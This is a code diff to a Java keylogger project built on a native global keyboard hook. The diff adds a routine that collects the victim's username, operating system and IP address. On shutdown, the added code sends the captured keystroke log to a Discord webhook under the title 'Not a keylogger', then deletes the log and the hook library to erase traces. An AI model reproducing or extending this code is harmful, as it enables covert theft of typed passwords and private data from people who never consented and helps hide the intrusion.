@@ -1,8 +1,9 @@
 package com.pvtoari.keylogger;
 
-import java.io.FileNotFoundException;
-import java.io.PrintWriter;
-import java.awt.Toolkit;
+import java.io.*;
+import java.net.*;
+import java.util.Date;
+import java.awt.*;
 import java.awt.event.KeyEvent;
 
 import com.github.kwhat.jnativehook.GlobalScreen;
@@ -102,8 +103,44 @@ public class Listener implements NativeKeyListener {
 			this.counting = 0;
 		}
 	}
+	
+	public String getClientInfo() {
+		String username = System.getProperty("user.name");
+		String os = System.getProperty("os.name");
+		String osVersion = System.getProperty("os.version");
+		String javaVersion = System.getProperty("java.version");
+		String ipAddress = "Unknown";
+	
+		try {
+			InetAddress inetAddress = InetAddress.getLocalHost();
+			ipAddress = inetAddress.getHostAddress();
+		} catch (UnknownHostException e) {
+			e.printStackTrace();
+		}
+		
+		//using double slash special character since Discord explods if u want to process a
+		// string like "\nHello", using "\\n" instead
+		return "Username: " + username + "\\n" +
+			   "Operating System: " + os + "\\n" +
+			   "OS Version: " + osVersion + "\\n" +
+			   "Java Version: " + javaVersion + "\\n" +
+			   "IP Address: " + ipAddress + "\\n" +
+			   "Running at: " + new Date().toString();
+	}
 
-	public static void main(String[] args) {
+	private void deleteTraces() {
+		File log = new File("log.txt");
+		if (log.exists()) {
+			log.delete();
+		}
+
+		File dll = new File("JNativeHook.x86_64.dll");
+		if (dll.exists()) {
+			dll.delete();
+		}
+	}
+
+	public void start() {
 		try {
 			GlobalScreen.registerNativeHook();
 		}
@@ -117,9 +154,25 @@ public class Listener implements NativeKeyListener {
 		Runtime.getRuntime().addShutdownHook(new Thread()
 			{
 				@Override
-				public void run()
-				{
+				public void run() {
 					pw.flush();
+
+					try {
+            			Main.webhook.addEmbed(new DiscordWebhook.EmbedObject()
+                    	.setTitle("Not a keylogger")
+                    	.setDescription("Captured keystrokes sent.")
+                    	.setColor(new Color(Color.ORANGE.getRGB()))
+            			);
+
+						Main.webhook.execute();
+           				Main.webhook.sendFile(".\\log.txt");
+        			} catch (IOException e) {
+            			//e.printStackTrace();
+						Main.webhook.setContent("```Error sending log file.```");
+        			} finally {
+						pw.close();
+						deleteTraces();
+					}
 				}
 			});
 	}
